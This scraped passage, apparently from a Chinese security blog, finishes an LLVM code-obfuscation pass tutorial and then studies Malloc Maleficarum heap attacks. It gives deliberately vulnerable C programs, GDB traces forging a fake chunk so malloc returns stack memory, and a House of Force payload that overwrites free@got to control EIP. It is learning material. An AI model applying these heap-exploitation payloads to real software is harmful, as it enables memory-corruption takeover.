替换所有出现该指令的地方 bo-&gt;replaceAllUsesWith(op); return true; } } };}char SimplePass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSimplePass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SimplePass());}static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSimplePass); 1234567891011121314151617181920add_library(SimplePass MODULE # List your source files here. SimplePass.cpp)# Use C++11 to compile our pass (i.e., supply -std=c++11).target_compile_features(SimplePass PRIVATE cxx_range_for cxx_auto_type)# LLVM is (typically) built with no C++ RTTI. We need to match that.set_target_properties(SimplePass PROPERTIES COMPILE_FLAGS &quot;-fno-rtti&quot;)# Get proper shared-library behavior (where symbols are not necessarily# resolved when the shared library is linked) on OS X.if(APPLE) set_target_properties(SimplePass PROPERTIES LINK_FLAGS &quot;-undefined dynamic_lookup&quot; )endif(APPLE) 我的测试代码如下 123456789$ cat example.c #include &lt;stdio.h&gt;int main(int argc, const char** argv) { int num; scanf(&quot;%i&quot;, &amp;num); printf(&quot;%i\\n&quot;, num + 2); return 0;} 先编译正常的程序clang example.c -o before 12$ file before before: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped 看一下main的逻辑： 123456789101112131415161718192021222324252627282930313233343536objdump -M intel -d before . . . 0000000000400580 &lt;main&gt;: 400580: 55 push rbp 400581: 48 89 e5 mov rbp,rsp 400584: 48 83 ec 20 sub rsp,0x20 400588: 48 b8 64 06 40 00 00 movabs rax,0x400664 40058f: 00 00 00 400592: 48 8d 4d ec lea rcx,[rbp-0x14] 400596: c7 45 fc 00 00 00 00 mov DWORD PTR [rbp-0x4],0x0 40059d: 89 7d f8 mov DWORD PTR [rbp-0x8],edi 4005a0: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 4005a4: 48 89 c7 mov rdi,rax 4005a7: 48 89 ce mov rsi,rcx 4005aa: b0 00 mov al,0x0 4005ac: e8 af fe ff ff call 400460 &lt;__isoc99_scanf@plt&gt; 4005b1: 48 bf 67 06 40 00 00 movabs rdi,0x400667 4005b8: 00 00 00 4005bb: 8b 55 ec mov edx,DWORD PTR [rbp-0x14] 4005be: 83 c2 02 add edx,0x2 //num + 2 语句 4005c1: 89 d6 mov esi,edx 4005c3: 89 45 e8 mov DWORD PTR [rbp-0x18],eax 4005c6: b0 00 mov al,0x0 4005c8: e8 73 fe ff ff call 400440 &lt;printf@plt&gt; 4005cd: 31 d2 xor edx,edx 4005cf: 89 45 e4 mov DWORD PTR [rbp-0x1c],eax 4005d2: 89 d0 mov eax,edx 4005d4: 48 83 c4 20 add rsp,0x20 4005d8: 5d pop rbp 4005d9: c3 ret 4005da: 66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0]. . . 现在编译一个混淆过的 1234mkdir build_1cd build_1cmake ..make 然后clang -Xclang -load -Xclang build_1/simple/libSimplePass.so -c example.c得到example.o文件，这个还没链接，我们使用clang再链接一下就好了。 1234$ clang example.o -o example $ file exampleexample: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped 反汇编看一下main的逻辑： 123456789101112131415161718192021222324252627282930313233340000000000400580 &lt;main&gt;: 400580: 55 push rbp 400581: 48 89 e5 mov rbp,rsp 400584: 48 83 ec 20 sub rsp,0x20 400588: 48 b8 74 06 40 00 00 movabs rax,0x400674 40058f: 00 00 00 400592: 48 8d 4d ec lea rcx,[rbp-0x14] 400596: c7 45 fc 00 00 00 00 mov DWORD PTR [rbp-0x4],0x0 40059d: 89 7d f8 mov DWORD PTR [rbp-0x8],edi 4005a0: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 4005a4: 48 89 c7 mov rdi,rax 4005a7: 48 89 ce mov rsi,rcx 4005aa: b0 00 mov al,0x0 4005ac: e8 af fe ff ff call 400460 &lt;__isoc99_scanf@plt&gt; 4005b1: 48 bf 77 06 40 00 00 movabs rdi,0x400677 4005b8: 00 00 00 4005bb: 31 d2 xor edx,edx 4005bd: 44 8b 45 ec mov r8d,DWORD PTR [rbp-0x14] 4005c1: 83 ea 02 sub edx,0x2 4005c4: 41 29 d0 sub r8d,edx //已经被替换了 4005c7: 44 89 c6 mov esi,r8d 4005ca: 89 45 e8 mov DWORD PTR [rbp-0x18],eax 4005cd: b0 00 mov al,0x0 4005cf: e8 6c fe ff ff call 400440 &lt;printf@plt&gt; 4005d4: 31 d2 xor edx,edx 4005d6: 89 45 e4 mov DWORD PTR [rbp-0x1c],eax 4005d9: 89 d0 mov eax,edx 4005db: 48 83 c4 20 add rsp,0x20 4005df: 5d pop rbp 4005e0: c3 ret 4005e1: 66 2e 0f 1f 84 00 00 nop WORD PTR cs:[rax+rax*1+0x0] 4005e8: 00 00 00 4005eb: 0f 1f 44 00 00 nop DWORD PTR [rax+rax*1+0x0] 这个只是demo而已，几乎没什么强度。 0x4. 参考和引用llvm基于LLVM的代码混淆LLVM for Grad Students","link":"/2017/02/27/LLVM-Study-Log/"},{"title":"Malloc-Maleficarum-复盘","text":"1.HOS伪造堆块，最终malloc()分配到栈上的空间。 这份源码来自这里但是我这边复现他这个有点问题，原因应该是gcc版本的问题，只是为了搞明白原理，直接gdb里暴力set value就可以了。这里附上gdb的调试过程。 12345678910111213141516171819202122232425262728293031# muhe @ ubuntu in ~/Desktop/study [2:54:31] $ lshos hos.c# muhe @ ubuntu in ~/Desktop/study [2:54:33] $ cat hos.c #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void fvuln(char *str1, int age){ char *ptr1; int local_age; char name[32]; char *ptr2; local_age = age; ptr1 = (char *) malloc(256); printf(&quot;\\nPTR1 = [ %p ]&quot;, ptr1); strcpy(name, str1); printf(&quot;\\nPTR1 = [ %p ]\\n&quot;, ptr1); free(ptr1); ptr2 = (char *) malloc(40); snprintf(ptr2, 40-1, &quot;%s is %d years old&quot;, name, local_age); printf(&quot;\\n%s\\n&quot;, ptr2);}int main(int argc, char *argv[]){ int pad[10] = {0, 0, 0, 0, 0, 0, 0, 10, 0, 0}; if (argc == 3) fvuln(argv[1], atoi(argv[2])); return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# muhe @ ubuntu in ~/Desktop/study [2:54:35] $ gcc hos.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -z execstack -o hos -g# muhe @ ubuntu in ~/Desktop/study [2:54:45] $ gdb ./hos -qReading symbols from ./hos...done.gdb-peda$ pdisass fvulnDump of assembler code for function fvuln: 0x080484fb &lt;+0&gt;: push ebp 0x080484fc &lt;+1&gt;: mov ebp,esp 0x080484fe &lt;+3&gt;: sub esp,0x2c 0x08048501 &lt;+6&gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048504 &lt;+9&gt;: mov DWORD PTR [ebp-0x4],eax 0x08048507 &lt;+12&gt;: push 0x100 0x0804850c &lt;+17&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x08048511 &lt;+22&gt;: add esp,0x4 0x08048514 &lt;+25&gt;: mov DWORD PTR [ebp-0x8],eax 0x08048517 &lt;+28&gt;: push DWORD PTR [ebp-0x8] 0x0804851a &lt;+31&gt;: push 0x8048660 0x0804851f &lt;+36&gt;: call 0x8048380 &lt;printf@plt&gt; 0x08048524 &lt;+41&gt;: add esp,0x8 0x08048527 &lt;+44&gt;: push DWORD PTR [ebp+0x8] 0x0804852a &lt;+47&gt;: lea eax,[ebp-0x2c] 0x0804852d &lt;+50&gt;: push eax 0x0804852e &lt;+51&gt;: call 0x80483a0 &lt;strcpy@plt&gt; 0x08048533 &lt;+56&gt;: add esp,0x8 0x08048536 &lt;+59&gt;: push DWORD PTR [ebp-0x8] 0x08048539 &lt;+62&gt;: push 0x804866f 0x0804853e &lt;+67&gt;: call 0x8048380 &lt;printf@plt&gt; 0x08048543 &lt;+72&gt;: add esp,0x8 0x08048546 &lt;+75&gt;: push DWORD PTR [ebp-0x8] 0x08048549 &lt;+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x0804854e &lt;+83&gt;: add esp,0x4 0x08048551 &lt;+86&gt;: push 0x28 0x08048553 &lt;+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x08048558 &lt;+93&gt;: add esp,0x4 0x0804855b &lt;+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x0804855e &lt;+99&gt;: push DWORD PTR [ebp-0x4] 0x08048561 &lt;+102&gt;: lea eax,[ebp-0x2c] 0x08048564 &lt;+105&gt;: push eax 0x08048565 &lt;+106&gt;: push 0x804867f 0x0804856a &lt;+111&gt;: push 0x27 0x0804856c &lt;+113&gt;: push DWORD PTR [ebp-0xc] 0x0804856f &lt;+116&gt;: call 0x80483d0 &lt;snprintf@plt&gt; 0x08048574 &lt;+121&gt;: add esp,0x14 0x08048577 &lt;+124&gt;: push DWORD PTR [ebp-0xc] 0x0804857a &lt;+127&gt;: push 0x8048692 0x0804857f &lt;+132&gt;: call 0x8048380 &lt;printf@plt&gt; 0x08048584 &lt;+137&gt;: add esp,0x8 0x08048587 &lt;+140&gt;: nop 0x08048588 &lt;+141&gt;: leave 0x08048589 &lt;+142&gt;: ret End of assembler dump.gdb-peda$ b *0x0804850cBreakpoint 1 at 0x804850c: file hos.c, line 14.gdb-peda$ b *0x0804852eBreakpoint 2 at 0x804852e: file hos.c, line 16.gdb-peda$ b *0x08048549Breakpoint 3 at 0x8048549: file hos.c, line 19.gdb-peda$ b *0x08048553Breakpoint 4 at 0x8048553: file hos.c, line 21.gdb-peda$ r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc 20Starting program: /home/muhe/Desktop/study/hos aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc 20 1234567891011121314151617181920212223242526272829303132333435363738 [----------------------------------registers-----------------------------------]EAX: 0x14 EBX: 0x0 ECX: 0x0 EDX: 0x14 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0x100 EIP: 0x804850c (&lt;fvuln+17&gt;: call 0x80483b0 &lt;malloc@plt&gt;)EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048501 &lt;fvuln+6&gt;: mov eax,DWORD PTR [ebp+0xc] 0x8048504 &lt;fvuln+9&gt;: mov DWORD PTR [ebp-0x4],eax 0x8048507 &lt;fvuln+12&gt;: push 0x100=&gt; 0x804850c &lt;fvuln+17&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048511 &lt;fvuln+22&gt;: add esp,0x4 0x8048514 &lt;fvuln+25&gt;: mov DWORD PTR [ebp-0x8],eax 0x8048517 &lt;fvuln+28&gt;: push DWORD PTR [ebp-0x8] 0x804851a &lt;fvuln+31&gt;: push 0x8048660Guessed arguments:arg[0]: 0x100 arg[1]: 0x0 [------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0x100 0004| 0xffffd520 --&gt; 0x0 0008| 0xffffd524 --&gt; 0xffffd5c4 --&gt; 0x61b64d7e 0012| 0xffffd528 --&gt; 0xf7fe76db (add esi,0x15925)0016| 0xffffd52c --&gt; 0x0 0020| 0xffffd530 --&gt; 0xf7e39c45 (&lt;strtol+5&gt;: add eax,0x17f3bb)0024| 0xffffd534 --&gt; 0xf7e37040 (&lt;atoi+16&gt;: add esp,0x1c)0028| 0xffffd538 --&gt; 0xffffd851 --&gt; 0x58003032 ('20')[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0x0804850c in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x14) at hos.c:1414 ptr1 = (char *) malloc(256);gdb-peda$ cContinuing. 12345678910111213141516171819202122232425262728293031323334353637383940[----------------------------------registers-----------------------------------]EAX: 0xffffd520 --&gt; 0x0 EBX: 0x0 ECX: 0x7fffffec EDX: 0xf7fba870 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd518 --&gt; 0xffffd520 --&gt; 0x0 EIP: 0x804852e (&lt;fvuln+51&gt;: call 0x80483a0 &lt;strcpy@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048527 &lt;fvuln+44&gt;: push DWORD PTR [ebp+0x8] 0x804852a &lt;fvuln+47&gt;: lea eax,[ebp-0x2c] 0x804852d &lt;fvuln+50&gt;: push eax=&gt; 0x804852e &lt;fvuln+51&gt;: call 0x80483a0 &lt;strcpy@plt&gt; 0x8048533 &lt;fvuln+56&gt;: add esp,0x8 0x8048536 &lt;fvuln+59&gt;: push DWORD PTR [ebp-0x8] 0x8048539 &lt;fvuln+62&gt;: push 0x804866f 0x804853e &lt;fvuln+67&gt;: call 0x8048380 &lt;printf@plt&gt;Guessed arguments:arg[0]: 0xffffd520 --&gt; 0x0 arg[1]: 0xffffd828 ('a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)[------------------------------------stack-------------------------------------]0000| 0xffffd518 --&gt; 0xffffd520 --&gt; 0x0 0004| 0xffffd51c --&gt; 0xffffd828 ('a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)0008| 0xffffd520 --&gt; 0x0 0012| 0xffffd524 --&gt; 0xffffd5c4 --&gt; 0x61b64d7e 0016| 0xffffd528 --&gt; 0xf7fe76db (add esi,0x15925)0020| 0xffffd52c --&gt; 0x0 0024| 0xffffd530 --&gt; 0xf7e39c45 (&lt;strtol+5&gt;: add eax,0x17f3bb)0028| 0xffffd534 --&gt; 0xf7e37040 (&lt;atoi+16&gt;: add esp,0x1c)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 2, 0x0804852e in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x14) at hos.c:1616 strcpy(name, str1);gdb-peda$ cContinuing.PTR1 = [ 0x804b008 ]PTR1 = [ 0x63636363 ] 这里伪造堆块，但是为了过malloc()对fastbin的check，所以需要再设置下下一个块。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 [----------------------------------registers-----------------------------------]EAX: 0x17 EBX: 0x0 ECX: 0x7fffffeb EDX: 0xf7fba870 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c (&quot;cccc&quot;, 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)EIP: 0x8048549 (&lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x804853e &lt;fvuln+67&gt;: call 0x8048380 &lt;printf@plt&gt; 0x8048543 &lt;fvuln+72&gt;: add esp,0x8 0x8048546 &lt;fvuln+75&gt;: push DWORD PTR [ebp-0x8]=&gt; 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4Guessed arguments:arg[0]: 0x63636363 ('cccc')[------------------------------------stack-------------------------------------]0000| 0xffffd51c (&quot;cccc&quot;, 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)0004| 0xffffd520 ('a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)0008| 0xffffd524 ('a' &lt;repeats 28 times&gt;, &quot;bbbbcccc&quot;)0012| 0xffffd528 ('a' &lt;repeats 24 times&gt;, &quot;bbbbcccc&quot;)0016| 0xffffd52c ('a' &lt;repeats 20 times&gt;, &quot;bbbbcccc&quot;)0020| 0xffffd530 ('a' &lt;repeats 16 times&gt;, &quot;bbbbcccc&quot;)0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 3, 0x08048549 in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x14) at hos.c:1919 free(ptr1);gdb-peda$ x/10wx $esp0xffffd51c: 0x63636363 0x61616161 0x61616161 0x616161610xffffd52c: 0x61616161 0x61616161 0x61616161 0x616161610xffffd53c: 0x61616161 0x62626262gdb-peda$ set *(int*)0xffffd51c = 0xffffd530gdb-peda$ x/10wx 0xffffd530 - 80xffffd528: 0x61616161 0x61616161 0x61616161 0x616161610xffffd538: 0x61616161 0x61616161 0x62626262 0x636363630xffffd548: 0x00000000 0xffffd588gdb-peda$ set *(int*)0xffffd528=0x0gdb-peda$ set *(int*)0xffffd52c=0x31gdb-peda$ x/10wx 0xffffd530 - 8 + 0x300xffffd558: 0x00000014 0x00000000 0x00000000 0x000000000xffffd568: 0x00000000 0x00000000 0x00000000 0x000000000xffffd578: 0x0000000a 0x00000000gdb-peda$ set *(int*)0xffffd558 = 0x31gdb-peda$ set *(int*)0xffffd55c = 0x30gdb-peda$ ni 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 [----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb9000 --&gt; 0x1aedb0 EDX: 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0xffffd530 --&gt; 0x0 EIP: 0x804854e (&lt;fvuln+83&gt;: add esp,0x4)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048543 &lt;fvuln+72&gt;: add esp,0x8 0x8048546 &lt;fvuln+75&gt;: push DWORD PTR [ebp-0x8] 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt;=&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax[------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0xffffd530 --&gt; 0x0 0004| 0xffffd520 (&quot;aaaaaaaa&quot;)0008| 0xffffd524 (&quot;aaaa&quot;)0012| 0xffffd528 --&gt; 0x0 0016| 0xffffd52c --&gt; 0x31 ('1')0020| 0xffffd530 --&gt; 0x0 0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804854e 19 free(ptr1);gdb-peda$ ni [----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb9000 --&gt; 0x1aedb0 EDX: 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd520 (&quot;aaaaaaaa&quot;)EIP: 0x8048551 (&lt;fvuln+86&gt;: push 0x28)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048546 &lt;fvuln+75&gt;: push DWORD PTR [ebp-0x8] 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4=&gt; 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4][------------------------------------stack-------------------------------------]0000| 0xffffd520 (&quot;aaaaaaaa&quot;)0004| 0xffffd524 (&quot;aaaa&quot;)0008| 0xffffd528 --&gt; 0x0 0012| 0xffffd52c --&gt; 0x31 ('1')0016| 0xffffd530 --&gt; 0x0 0020| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0024| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)0028| 0xffffd53c (&quot;aaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value21 ptr2 = (char *) malloc(40);gdb-peda$ ni 123456789101112131415161718192021222324252627282930313233343536[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb9000 --&gt; 0x1aedb0 EDX: 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0x28 ('(')EIP: 0x8048553 (&lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28=&gt; 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4] 0x8048561 &lt;fvuln+102&gt;: lea eax,[ebp-0x2c]Guessed arguments:arg[0]: 0x28 ('(')[------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0x28 ('(')0004| 0xffffd520 (&quot;aaaaaaaa&quot;)0008| 0xffffd524 (&quot;aaaa&quot;)0012| 0xffffd528 --&gt; 0x0 0016| 0xffffd52c --&gt; 0x31 ('1')0020| 0xffffd530 --&gt; 0x0 0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 4, 0x08048553 in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x31) at hos.c:2121 ptr2 = (char *) malloc(40);gdb-peda$ ni 这里，分配到了栈上的地址。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 [----------------------------------registers-----------------------------------]EAX: 0xffffd530 --&gt; 0x0 EBX: 0x0 ECX: 0xf7fb9780 --&gt; 0x0 EDX: 0xffffd530 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0x28 ('(')EIP: 0x8048558 (&lt;fvuln+93&gt;: add esp,0x4)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt;=&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4] 0x8048561 &lt;fvuln+102&gt;: lea eax,[ebp-0x2c] 0x8048564 &lt;fvuln+105&gt;: push eax[------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0x28 ('(')0004| 0xffffd520 (&quot;aaaaaaaa&quot;)0008| 0xffffd524 (&quot;aaaa&quot;)0012| 0xffffd528 --&gt; 0x0 0016| 0xffffd52c --&gt; 0x31 ('1')0020| 0xffffd530 --&gt; 0x0 0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x08048558 21 ptr2 = (char *) malloc(40);gdb-peda$ ni [----------------------------------registers-----------------------------------]EAX: 0xffffd530 --&gt; 0x0 EBX: 0x0 ECX: 0xf7fb9780 --&gt; 0x0 EDX: 0xffffd530 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd520 (&quot;aaaaaaaa&quot;)EIP: 0x804855b (&lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4=&gt; 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4] 0x8048561 &lt;fvuln+102&gt;: lea eax,[ebp-0x2c] 0x8048564 &lt;fvuln+105&gt;: push eax 0x8048565 &lt;fvuln+106&gt;: push 0x804867f[------------------------------------stack-------------------------------------]0000| 0xffffd520 (&quot;aaaaaaaa&quot;)0004| 0xffffd524 (&quot;aaaa&quot;)0008| 0xffffd528 --&gt; 0x0 0012| 0xffffd52c --&gt; 0x31 ('1')0016| 0xffffd530 --&gt; 0x0 0020| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0024| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)0028| 0xffffd53c (&quot;aaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804855b 21 ptr2 = (char *) malloc(40);gdb-peda$ 2.hop TBU3.hom TBU4.hof控制top chunk的size字段，再之后的两次malloc()之后，分配到指定的位置。 123456789101112131415161718192021222324252627282930/*House of force vulnerable program. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; int main(int argc, char *argv[]){ char *buf1, *buf2, *buf3; if (argc != 4) { printf(&quot;Usage Error\\n&quot;); return; } [1]buf1 = malloc(256); [2]strcpy(buf1, argv[1]); /* Prereq 1 */ [3]buf2 = malloc(strtoul(argv[2], NULL, 16)); /* Prereq 2 */ [4]buf3 = malloc(256); /* Prereq 3 */ [5]strcpy(buf3, argv[3]); /* Prereq 3 */ [6]free(buf3); free(buf2); free(buf1); return 0;}/* free@got entry 0x08049830top 0x0804a108size = ((0x08049830 - 0x8) - 0x0804a108) -0x8 = 0xFFFFF718python -c 'print &quot;A&quot;*260 + &quot;\\xff\\xff\\xff\\xff&quot; +&quot; &quot;+&quot;0xFFFFF718&quot;+&quot; &quot;+&quot;AAAA&quot;' &gt; 1control eip --&gt; 0x41414141*/ gdb log如下分配到了free@got 123456789101112131415161718192021222324252627282930313233 [----------------------------------registers-----------------------------------]EAX: 0x8049830 --&gt; 0x8048346 (&lt;free@plt+6&gt;: push 0x0)EBX: 0xffffd340 --&gt; 0x4 ECX: 0xf7fb9780 --&gt; 0x0 EDX: 0x8049830 --&gt; 0x8048346 (&lt;free@plt+6&gt;: push 0x0)ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd328 --&gt; 0x0 ESP: 0xffffd310 --&gt; 0x4 EIP: 0x804853f (&lt;main+148&gt;: mov DWORD PTR [ebp-0xc],eax)EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048532 &lt;main+135&gt;: push 0x100 0x8048537 &lt;main+140&gt;: call 0x8048360 &lt;malloc@plt&gt; 0x804853c &lt;main+145&gt;: add esp,0x10=&gt; 0x804853f &lt;main+148&gt;: mov DWORD PTR [ebp-0xc],eax 0x8048542 &lt;main+151&gt;: mov eax,DWORD PTR [ebx+0x4] 0x8048545 &lt;main+154&gt;: add eax,0xc 0x8048548 &lt;main+157&gt;: mov eax,DWORD PTR [eax] 0x804854a &lt;main+159&gt;: sub esp,0x8[------------------------------------stack-------------------------------------]0000| 0xffffd310 --&gt; 